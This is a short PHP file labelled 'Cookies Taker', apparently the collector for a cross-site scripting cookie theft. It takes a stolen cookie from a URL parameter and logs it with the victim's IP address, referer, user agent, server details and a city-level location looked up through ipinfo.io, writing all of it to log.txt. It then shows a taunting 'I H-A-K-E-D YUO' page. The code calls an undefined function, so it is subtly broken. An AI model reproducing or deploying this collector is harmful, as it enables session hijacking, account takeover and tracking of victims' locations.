<?php

############################
#
# Cookies Taker ...!!!!
# By..Mustafa-Muslim
#
############################

$cookie = "[1] Cookie => [" . $_GET['cookie'] . " ]";
$ip = "[1] ip => [" . $_SERVER['REMOTE_ADDR'] . " ]";
$refeler = "[1] refeler  => [" . $_SERVER['HTTP_REFERER'] . " ]";
$user_agent = "[1] user_agent   => [" . $_SERVER['HTTP_USER_AGENT'] . " ]";
$service_name = "[1] service_name  => [" . $_SERVER['SERVER_NAME'] . " ]";
$service_ip = "[1] service_ip   => [" . $_SERVER['SERVER_ADDR'] . " ]";

function client_ip()
{
   $ipaddress = '';
   if (isset($_SERVER['HTTP_CLIENT_IP'])) {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
   } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
       $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
   } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
       $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
   } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
       $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
   } else if (isset($_SERVER['HTTP_FORWARDED'])) {
       $ipaddress = $_SERVER['HTTP_FORWARDED'];
   } else if (isset($_SERVER['REMOTE_ADDR'])) {
       $ipaddress = $_SERVER['REMOTE_ADDR'];
   } else{
       $ipaddress = 'UNKNOWN';
   }
 
   return $ipaddress;

}

$public_ip = get_client_ip();
$json      = file_get_contents("http://ipinfo.io/$public_ip/geo");
$json      = json_decode($json, true);
$country   = "user country is => " . $json['country'];
$region    = "user region is => " . $json['region'];
$city      = "user city is => " . $json['city'];
$all = "\n-----{Begin}-----\n" . $cookie . "\n\n" . $ip . "\n\n" . $refeler . "\n\n" . $user_agent . "\n\n" . $service_name . "\n\n" . $service_ip . "\n\n" . "-----{LOCATION}-----" ."\n\n". $country . "\n" . $region . "\n" . $city . "\n\n" . "-----{END}------";
$handle = fopen('log.txt','a');
fwrite($handle, $all);
fclose($handle);


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body style="background-color: rgb(14, 2, 2);">
    
  <center>
    <br>
    <br>
    <h1 style="color: azure;"> <i>HELLO A-H-M-E-D  </i></h1>
<br>
        <img style='box-shadow: 0px 4px 10px 0px white;'  src=" A.png">
        <br>
        
        <br>
        
    <h1 style="color: azure;"><i> I H-A-K-E-D YUO </i></h1> 
  </center>

</body>


</html>
